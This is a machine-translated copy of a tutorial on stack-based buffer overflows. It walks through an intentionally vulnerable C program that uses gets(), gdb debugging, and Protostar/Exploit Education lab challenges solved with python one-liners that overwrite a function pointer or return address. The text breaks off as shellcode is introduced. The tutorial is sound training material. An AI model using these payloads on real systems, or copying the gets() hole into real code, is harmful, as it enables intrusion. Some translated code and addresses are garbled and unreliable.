<html>
<head>
<title>Into the art of Binary Exploitation 0x000001 [Stack-Based Overflow]</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">二进制开发艺术0x 000001[基于堆栈的溢出]</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10?source=collection_archive---------0-----------------------#2021-08-23">https://infosecwriteups.com/into-the-art-of-binary-exploitation-0x000001-stack-based-overflow-50fe48d58f10?source=collection_archive---------0-----------------------#2021-08-23</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/8cc818578e0c9ff743575aa63275e088.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-3LfdBl9618NQFMfUGztdw.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">黑客是指那些编写代码和利用代码的人。</figcaption></figure><p id="df9e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">亲爱的黑客和信息安全爱好者们，✋🏻</p><p id="a5c2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">在这里，我打算发布一系列关于“<strong class="ke ir">二进制开发</strong>”的文章。如你所知，这是黑客空间的一个巨大的核心领域。在我开始之前，坦率地说，对于没有计算机科学背景的人来说，这可能不值得他们花时间&amp;我希望/希望我会尽可能使它变得简单。写所有的基础知识是不舒服的，所以我只写重点。如果你有一个好的基础，那么你会喜欢跟随。</p><h1 id="582b" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">什么是二进制剥削？？</h1><p id="cdec" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">二进制利用是网络安全中的一个广泛话题，归结为找到程序中的漏洞，并利用它来控制外壳或修改程序的功能。计算机能够理解的语言部分称为“二进制”计算机以二进制运行，这意味着它们只使用0和1来存储数据和进行计算。在布尔逻辑中，一个二进制数字只能代表真(1)或假(0)。每种语言都有其独特的特性，尽管编程语言之间往往存在共性。它的工作原理是将弱点转化为优势，即利用缺陷或漏洞来导致意外或未预料到的行为。</p><blockquote class="md me mf"><p id="9a11" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">⚡先决条件</p><p id="2ad5" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">➜编程基础，汇编(64位)，Linux终端使用。</p></blockquote><p id="038e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">所以让我们从一个简单的<strong class="ke ir">基于堆栈的缓冲区溢出</strong>开始</p><h1 id="c424" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">缓冲区溢出</h1><p id="b5ec" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">有两种不同类型的缓冲区溢出攻击。这些是基于堆栈和基于堆的缓冲区溢出。在这两种情况下，这种类型的利用利用了等待用户输入的应用程序。它会导致程序崩溃或执行任意代码。当一个程序试图用超过预期容量的数据填充一个内存块(内存缓冲区时，就会发生缓冲区溢出。攻击者通过覆盖应用程序的内存来利用缓冲区溢出问题。缓冲区溢出是软件应用程序中常见的漏洞，利用这些漏洞可以实现远程代码执行(RCE)或执行拒绝服务(DoS)攻击。最简单也是最常见的缓冲区溢出是指缓冲区在堆栈上。缓冲区溢出的最重要原因是使用了不自动监控内存缓冲区或堆栈限制以防止(基于堆栈的)缓冲区溢出的编程语言。这些语言包括C和C++语言。下面给出一个例子。</p><h1 id="d89b" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">示例C程序</h1><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="7f8d" class="mt lb iq mp b gy mu mv l mw mx">#include &lt;err.h&gt;<br/>#include &lt;stdio.h&gt;<br/>#include &lt;stdlib.h&gt;<br/>#include &lt;string.h&gt;<br/>#include &lt;unistd.h&gt;</span><span id="4863" class="mt lb iq mp b gy my mv l mw mx">char *gets(char *);</span><span id="37f2" class="mt lb iq mp b gy my mv l mw mx">void abracadabra() {  <br/> printf("Success..! Function called :D\n");  <br/> exit(0);  <br/>}</span><span id="71ac" class="mt lb iq mp b gy my mv l mw mx">int main(int argc, char **argv) {  <br/> struct {  <br/> char buffer[64];  <br/> volatile int (*point)();  <br/> } hackvist;  <br/>  <br/> hackvist.point = NULL;  <br/> gets(hackvist.buffer);  <br/>  <br/> if (hackvist.point) {  <br/> printf("Function Pointer → %p\n", hackvist.point);  <br/> fflush(stdout);  <br/> hackvist.point();  <br/> } else {  <br/> printf("Try Again\n");  <br/> }  <br/>  <br/> exit(0);  <br/>}</span></pre><blockquote class="mz"><p id="5f65" class="na nb iq bd nc nd ne nf ng nh ni kz dk translated">如果你对C编程有所了解，你就会明白上面的代码是如何工作的。如果有点迷茫？等等，让我澄清一下。</p></blockquote><blockquote class="md me mf"><p id="e7ec" class="kc kd mg ke b kf nj kh ki kj nk kl km mh nl kp kq mi nm kt ku mj nn kx ky kz ij bi translated"><strong class="ke ir">我们的目标:</strong>执行不必要的功能“咒语”</p></blockquote><p id="8734" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">该代码提供了一个函数“abracadabra ”,它在任何地方都不会被调用。它包含一个大小为“64”的缓冲区和一个指针“*point”。point的值被设置为NULL，代码通过gets()请求用户输入。gets()从标准输入(stdin)中读取字符，并将它们作为C字符串存储到str中，直到到达换行符或文件结尾。随后，检查“指针值”(我们将它设置为缺省值)并打印该值。如果仍然，值为空？然后“再试一次”被打印出来。让我们编译并运行这个程序。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/184f93336e9122f84a499e7420b73586.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*HG5Qxbsy61hDsGVHguHfXw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">报警信息</figcaption></figure><p id="33d5" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir">代码编译成功&amp;准备执行。编译程序时，您会看到一条警告消息。在许多情况下，人们避免警告，每个人都关心“错误”。</strong></p><blockquote class="md me mf"><p id="6c6f" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">警告:“gets”函数很危险，不应使用。</p></blockquote><h1 id="6ccc" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">为什么中计()是危险的？？</strong></h1><p id="c4a7" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">这是不安全的，因为它假设了一致的输入。千万不要用！您不应该使用gets，因为它无法阻止缓冲区溢出。它不对其输入的大小执行边界检查。攻击者可以轻松地向gets()发送任意大小的输入，使目标缓冲区溢出。如果用户输入更多的数据，那么很可能会以损坏或更坏的结果告终。</p><p id="356e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我通过提供一些输入来运行程序。程序显示同样的输出“<strong class="ke ir">再试一次</strong>”。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/261cb650b41c9dcf562a1a656f90af26.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*Dq1YIYgJJwlOFXUM_dgsBw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">输出</figcaption></figure><p id="2caa" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这假设“else”语句被打印出来。</p><blockquote class="md me mf"><p id="353b" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">if (hackvist.point) { <br/> printf("函数指针→ %p\n "，hack vist . point)；<br/>fflush(stdout)；<br/>hack vist . point()；<br/><strong class="ke ir"/>}<strong class="ke ir">else {<br/>printf("重试\ n ")；</strong><em class="iq">//*这个*// </em> <br/> }</p></blockquote><p id="39d2" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">这意味着指针值仍然为空。" hackvist.point = NULL "。所以让我们开始吧。</p><blockquote class="mz"><p id="2615" class="na nb iq bd nc nd nq nr ns nt nu kz dk translated">意图是颠覆执行流程&amp;运行函数“abracadabra”。让我们开始调试代码。</p></blockquote><figure class="nv nw nx ny nz jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/9bfe5bcb6ee2fa8bf087feed3b1ea313.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XgMtVVcfYykjSxtKpUlgRg.png"/></div></div></figure><blockquote class="md me mf"><p id="f2e9" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">首先，我要中断main，不带任何输入地运行。</p><p id="ab15" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">0x119a处的b主<br/>断点1</p></blockquote><p id="5560" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我通过输入ni跳过每条指令。终于到了gets()函数的地步。我没有提供任何值和分析流</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/0ae48a262a8e61aaf6c9141e34681187.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*NIl3-bW__I6W7CvRe_M1FA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">je在gets()之后</figcaption></figure><p id="8194" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">正如我所说的，我没有提供任何值作为输入。代码正常执行。指针值为空，因此执行“else”语句。结果如下所示。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/4dd859168446744def051819b0811baf.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*SNRzBC_Ag6INlN21kIhASA.png"/></div></div></figure><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi no"><img src="../Images/53690904ea4d5bdb29c221f5b69cef93.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MvaN_sgn87cBGlTa4CtXpw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">执行的代码</figcaption></figure><p id="a9a3" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">现在，是时候通过传递值来进行分析了。缓冲区大小是64，所以我们将以可识别的格式传递这些值。所以很好理解。为此，我做了一个简单的python 2 liner。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oa"><img src="../Images/ad42b378cc7b654dcbc49b018eba319f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*nZVasQxxJlxeh09z6J4NeA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">利用. py</figcaption></figure><blockquote class="md me mf"><p id="eefa" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">我们必须使用它作为输入，所以我做得很简单，<br/> python exploit.py &gt; exp</p><p id="d1e6" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">主电源(断开主电源)</p><p id="4272" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">r &lt; exp (run our python script as input)</p></blockquote><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/243e4a2ceedf223a65a97cf22d203011.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jFy-JyQkr4Lla-ZJ0jBY6w.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">flow changed</figcaption></figure><p id="0919" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">The flow is changed! It overruns the buffer’s boundary and overwrites adjacent memory locations. So the pointer value is also changed from NULL !!</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/5d1cefe5e7c2bfe881d71b3b8306553d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*E481sPOyzLa8wSqD0i_xKw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">if (hackvist.point) { <br/> printf("函数指针→ %p\n "，hack vist . point)；</figcaption></figure><blockquote class="md me mf"><p id="d3f2" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">在连续执行else语句后，我们在<br/> if (hackvist.point) { printf("函数指针→ %p\n "，hack vist . point)；</p><p id="abe1" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated"><strong class="ke ir"> <em class="iq"> NB:指针值被改变！</em> </strong></p></blockquote><p id="ee33" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">继续倪的过程，我们可以发现一些有趣的东西。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/2728707c6e168bdde84ccdd94816da78.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lNoyPR0PZo8A4yJnh0iGVA.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">分段故障</figcaption></figure><h1 id="ae56" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated"><strong class="ak">分段故障</strong></h1><p id="b715" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">分段错误(又名segfault)是导致程序崩溃的常见情况。这是由于程序试图访问不允许访问的内存位置，或者试图以不允许的方式访问内存位置。所以，我们走上正轨了。现在我们可以传递相同的输入“r &lt; exp “ on gdb and analyze the register to confirm where the Overflow occurs!</p><p id="714a" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">By jumping next to the next instruction (ni) we’ll reach the point right before segf. The register values can analyze via python. The chr() method returns a string representing a character whose Unicode code point is an integer.</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/3385c40e38e00a6f9d7e9360048e3a4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*DqQSY3-tdnudcnEI3fkl3w.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">info registers</figcaption></figure><p id="79ab" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">In the previous example, we saw “Function Pointer → 0x5252525251515151\n”. We understand “Q” &amp; “R” seem to be overflowed, &amp; specific values are stored into the pointer after the buffer. So as the program “hackvist.point(); “ is called. Our intention is to run the function “abracadabra”. Obviously, if we placed the address of the function in the pointer, the program will call the function. Let’s check the address of “abracadabra”.</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/ba0c2ea8d4e607bdc26e388eef8536a9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*FokwoyXuKaEUm4OtEp1z-w.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">0x555555555179 <abracadabra/></figcaption></figure><p id="7786" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们得到了函数的地址。现在我们可以稍微编辑一下python脚本了。我们必须以合适的方式放置0x 5555555179 &amp;必须考虑<strong class="ke ir">字节序</strong>。为此，我清除了Q的溢出，因为我们知道输入是可识别的模式。我将地址“0x555555555179”添加到有效载荷&amp;中，保存它以供完成装订部移动。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi np"><img src="../Images/388247eed1d127292eab4df20622bad0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*qrLN1Otb_Cd26HneHVo7aQ.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">最终利用</figcaption></figure><p id="2029" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">让我们运行这个python exploit . py &gt; exp &amp; " r&lt; exp” on gdb, in the same way, we used to do before. Now we can see that our aim is successful. The pointer value is now the address of “the function abracadabra”.</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi ob"><img src="../Images/762dd7cc5efea4d2eda3affd95227819.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*G3BOzmiguN9yh7kZ9_D1EQ.jpeg"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">use ni for jumping</figcaption></figure><p id="2df5" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">value of hackvist.point = the address of the function we wanna call. So,<br/>" hack vist . point()；调用函数“abracadabra”。我们可以执行这个功能。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oc"><img src="../Images/93db9901e4b3c1ea8ef0e1abc138aabc.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*X365yYeE7CXQ3QnUH7hTPA.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">执行函数“abracadabra”。</figcaption></figure><p id="1c52" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> Yaay！我们的目标完成了</strong>😈😈</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/622ca40827f28c0a6e885754ab01a8d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*e0E3VmNJIXvnYUGLD1_elg.gif"/></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">1337 H4x06</figcaption></figure><blockquote class="mz"><p id="e265" class="na nb iq bd nc nd ne nf ng nh ni kz dk translated"><strong class="ak">现在让我们来解决剥削教育带来的同样的模式化挑战。我们可以把命令行本身作为一种策略。</strong></p></blockquote><figure class="nv nw nx ny nz jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi oe"><img src="../Images/e40f4c727294c44c559c7d8ef149f664.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*muMQrZR2bEPMtMxIazZjUg.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">源代码</figcaption></figure><p id="19da" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">正如我们所做的，这里的目的是调用函数“<strong class="ke ir"> complete_level </strong>”。<br/>我们可以简单的通过objdump找到它的地址。</p><blockquote class="md me mf"><p id="a0c4" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">objdump-d ./stack-three | grep complete _ level</p></blockquote><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi of"><img src="../Images/652ec4a83e5e4628c9e3dc3cb6495f88.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*alj2TGFM4_9BEPGrGASYqw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">地址是:40069d</figcaption></figure><p id="abdb" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们必须把这个地址放到指针值中，然后它会调用这个函数。<br/>一个简单的python一行程序就足以通过溢出缓冲区来非常有效地解决这一挑战。结果如下所示。</p><blockquote class="md me mf"><p id="eddc" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">很简单，通过输入<br/>python-c ' print " A " * 64+" \ x9d \ x06 \ x40 " ' |。/stack-三</p></blockquote><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi og"><img src="../Images/e2a0c168777900815b5d1438e250c81b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2iPn-jSF_jOJ0TnEXuPDPw.png"/></div></div><figcaption class="jy jz gj gh gi ka kb bd b be z dk translated">万岁！我们做到了</figcaption></figure><p id="04e1" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> <em class="mg">没有“函数指针变量”和“没有修改变量”怎么办！！我们能执行一个函数吗？？</em>T3】</strong></p><p id="486e" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated"><strong class="ke ir"> Ans: </strong>当然！</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/0cae97e5bc829f8011fe309b9fe89ff0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*NVE4SxyODvV-ollhNPCkPA.gif"/></div></figure><h2 id="de35" class="mt lb iq bd lc oh oi dn lg oj ok dp lk kn ol om lo kr on oo ls kv op oq lw or bi translated">来源于剥削教育→原始人</h2><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="0d63" class="mt lb iq mp b gy mu mv l mw mx">#include &lt;stdlib.h&gt;<br/>#include &lt;unistd.h&gt;<br/>#include &lt;stdio.h&gt;<br/>#include &lt;string.h&gt;<br/><br/>void win()<br/>{<br/>  printf("code flow successfully changed\n");<br/>}<br/><br/>int main(int argc, char **argv)<br/>{<br/>  char buffer[64];<br/><br/>  gets(buffer);<br/>}</span></pre><p id="1cc6" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们需要重定向程序的执行流，并执行win函数，该函数不应该在理想情况下执行。<em class="mg">没有" f </em> <strong class="ke ir"> <em class="mg">功能指针变量</em> </strong> <em class="mg">和</em> <strong class="ke ir"> <em class="mg">没有修改变量</em> </strong> <em class="mg">。我们可以溢出堆栈上的返回指针，而不是溢出一个局部变量。它将读取错误的值&amp;转而运行。</em></p><h1 id="2b3a" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">让我们尝试溢出缓冲区并增加它，直到我们得到一个分段错误消息。</h1><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="15f3" class="mt lb iq mp b gy mu mv l mw mx">user@protostar:/opt/protostar/bin$ python -c 'print("A"*64)' | ./stack4<br/>user@protostar:/opt/protostar/bin$ python -c 'print("A"*70)' | ./stack4<br/>user@protostar:/opt/protostar/bin$ python -c 'print("A"*75)' | ./stack4<br/>user@protostar:/opt/protostar/bin$ python -c 'print("A"*76)' | ./stack4</span><span id="7da5" class="mt lb iq mp b gy my mv l mw mx">Segmentation fault</span></pre><p id="6b92" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">我们可以说76字节之后是覆盖指令指针的区域，所以我们需要76个‘A’和小端字节序的<em class="mg"> win </em>的地址。</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="f03c" class="mt lb iq mp b gy mu mv l mw mx">user@protostar:/opt/protostar/bin$ objdump -x stack4 | grep win</span><span id="77b4" class="mt lb iq mp b gy my mv l mw mx">080483f4 g     F .text 00000014              win</span></pre><p id="a387" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">于是我们得到了win的地址，就是“0x080483f4”。现在我们只需要用Python打印76 'A，然后是小端地址。</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="f348" class="mt lb iq mp b gy mu mv l mw mx">user@protostar:/opt/protostar/bin$ python -c 'print("A"*76 + "\xf4\x83\x04\x08")' | ./stack4</span><span id="da54" class="mt lb iq mp b gy my mv l mw mx"><strong class="mp ir">code flow successfully changed</strong></span><span id="f9ff" class="mt lb iq mp b gy my mv l mw mx">Segmentation fault<br/></span></pre><p id="c401" class="pw-post-body-paragraph kc kd iq ke b kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz ij bi translated">耶！！<strong class="ke ir">代码流已成功更改</strong>。我们执行了win函数。</p><blockquote class="md me mf"><p id="6765" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">分段故障？？这是因为在代码执行了win函数之后，它试图返回到堆栈上的下一个值。哪一个不是有效的代码区域:)</p></blockquote><h1 id="f218" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">如果我告诉你这只是一个开始呢？？</h1><p id="1e89" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">现在是时候用<strong class="ke ir">外壳代码</strong>编写我们的第一个BufferOverflow了，它向您展示了bufferOverflow将会有多么强大。在前面的例子中，我们已经看到，当程序接受用户控制的输入时，它可能不会检查长度，因此恶意用户可能会覆盖值并实际更改变量。我们可以控制函数返回的位置，并改变程序的执行流程。我们知道，我们可以通过将返回地址指向某个内存地址来控制执行流程，那么我们实际上如何做一些有用的事情呢？？这就是“<strong class="ke ir">外壳代码”</strong>的用武之地。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div class="gh gi od"><img src="../Images/1ba01cbfdd83cb1a863e6094ad7e3666.png" data-original-src="https://miro.medium.com/v2/resize:fit:1000/1*ddzrVGuh4cuw6FU60ZXmSQ.gif"/></div></figure><h1 id="087c" class="la lb iq bd lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx bi translated">外壳代码</h1><p id="785f" class="pw-post-body-paragraph kc kd iq ke b kf ly kh ki kj lz kl km kn ma kp kq kr mb kt ku kv mc kx ky kz ij bi translated">一种远程注入的特殊代码，黑客利用它来利用各种软件漏洞。之所以这样命名，是因为它通常会生成一个命令外壳，攻击者可以通过该外壳控制受影响的系统。它是一个机器码指令列表，开发的方式允许它在运行时被注入易受攻击的应用程序。</p><blockquote class="md me mf"><p id="920d" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">一般流程如下:</p><p id="6cf1" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">➟找出缓冲区的起始地址和返回地址的起始地址。</p><p id="720d" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">➟Calculate这些地址之间的差异，所以你知道有多少数据进入溢出。</p><p id="e745" class="kc kd mg ke b kf kg kh ki kj kk kl km mh ko kp kq mi ks kt ku mj kw kx ky kz ij bi translated">通过在缓冲区中输入外壳代码，在外壳代码和返回地址之间输入随机数据，并在返回地址中输入缓冲区的地址，➟Start退出。</p></blockquote><blockquote class="mz"><p id="3b9d" class="na nb iq bd nc nd ne nf ng nh ni kz dk translated">对于这个例子，让我们从THM room " <a class="ae os" 